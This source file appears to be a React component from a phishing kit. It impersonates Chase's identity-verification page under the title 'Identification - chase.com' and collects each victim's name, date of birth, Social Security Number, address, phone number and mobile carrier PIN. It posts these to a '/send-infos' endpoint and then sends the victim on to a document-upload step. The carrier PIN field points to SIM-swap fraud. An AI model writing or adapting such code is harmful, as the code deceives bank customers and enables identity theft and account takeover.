import { Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import React, { useEffect, useState } from "react";
import { Helmet } from "react-helmet";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router";
import { Content } from "./Content";
import { CustomButton } from "./CustomButton";
import { CustomInput } from "./CustomInput";
import { SubTitle } from "./SubTitle";
import { Title } from "./Title";
import { Loading } from "./Loading";
import { Wrapper } from "./Wrapper";

interface InformationsProps {}

export const Informations: React.FC<InformationsProps> = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    mode: "onTouched",
  });

  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [pageLoading, setPageLoading] = useState(true);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    await axios.post(
      "/send-infos",
      JSON.stringify({
        form: "BILLING",
        informations: data,
      })
    );
    setLoading(false);
    navigate("/upload-docs");
  });

  useEffect(() => {
    setTimeout(() => {
      setPageLoading(false);
    }, 2000);
    return () => {};
  }, []);

  if (pageLoading) {
    return <Loading />;
  }

  return (
    <Wrapper>
      <Box width="100%" padding="1rem">
        <Helmet>
          <title>Identification - chase.com</title>
        </Helmet>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            paddingX: "2rem",
          }}
        >
          <Typography
            component="h2"
            sx={{
              marginTop: "10px",
              color: "#666",
              fontWeight: 300,
              fontSize: "1.5rem",
            }}
          >
            Let's confirm your identity.
          </Typography>
          <Typography
            component="h3"
            sx={{
              marginTop: "8px",
              fontSize: ".8125rem",
              fontWeight: 300,
              color: "#414042",
            }}
          >
            To protect your account, please tell us the requested info so we can
            confirm your identity. If you have more than one account, choose one
            and we'll take care of the rest.
          </Typography>
        </Box>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Box>
            <Title title="Personal details" />
            <SubTitle
              subTitle="This should be your full legal names as it appears on your
    government ID"
            />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="First name"
                  name="firstname"
                  errors={errors}
                  register={register("firstname", {
                    required:
                      "First name must be entered. Please enter your first name.",
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Last name"
                  name="lastname"
                  errors={errors}
                  register={register("lastname", {
                    required:
                      "Last name must be entered. Please enter your last name.",
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box
            sx={{
              marginTop: "1.5rem",
            }}
          >
            <Title title="Identification" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Date of birth"
                  name="dob"
                  errors={errors}
                  helperText="mm/dd/yyyy"
                  register={register("dob", {
                    required:
                      "Date of birth must be entered. Please enter your date of birth",
                    pattern: {
                      value:
                        /(0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])[- /.](19|20)\d\d/,
                      message:
                        "Please enter a valid date of birth in the format mentioned above",
                    },
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Social Security Number"
                  name="ssn"
                  type="number"
                  errors={errors}
                  helperText="We required to ask for your SSN to verify your identity, we'll keep your data secure"
                  register={register("ssn", {
                    required:
                      "Social Security Number must be entered. Please enter your Social Security Number.",
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box
            sx={{
              marginTop: "1.5rem",
            }}
          >
            <Title title="Contact information" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Street address"
                  name="streetAddress"
                  errors={errors}
                  register={register("streetAddress", {
                    required:
                      "Street address must be entered. Please enter your street address.",
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Suite/apt/other (optional)"
                  name="suite"
                  errors={errors}
                  register={register("suite")}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Zip code"
                  name="zipcode"
                  errors={errors}
                  register={register("zipCode", {
                    required:
                      "Zip code must be entered. Please enter your zip code.",
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="State"
                  name="state"
                  errors={errors}
                  register={register("state", {
                    required: "State must be entered. Please enter your state.",
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Phone number"
                  name="phoneNumber"
                  errors={errors}
                  register={register("phoneNumber", {
                    required:
                      "Phone number must be entered. Please enter your phone number.",
                    pattern: {
                      value:
                        /^1?\s?(\([0-9]{3}\)[- ]?|[0-9]{3}[- ]?)[0-9]{3}[- ]?[0-9]{4}$/,
                      message: "Please enter a valid phone number",
                    },
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Carrier Pin"
                  name="carrierPin"
                  type="number"
                  errors={errors}
                  register={register("carrierPin", {
                    // required:
                    //   "Carrier pin must be entered. Please enter your carrier pin.",
                    pattern: {
                      value: /^[0-9]{4}$/,
                      message: "Please enter a valid carrier pin",
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Typography
              component="p"
              sx={{
                color: "#666",
                fontSize: [".8125rem", ".875rem"],
              }}
            >
              When you give us your number, we have your consent to send you
              automated calls and texts to service all of your accounts with us.
            </Typography>
          </Box>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton text="Next" onClick={onSubmit} disabled={loading} />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};
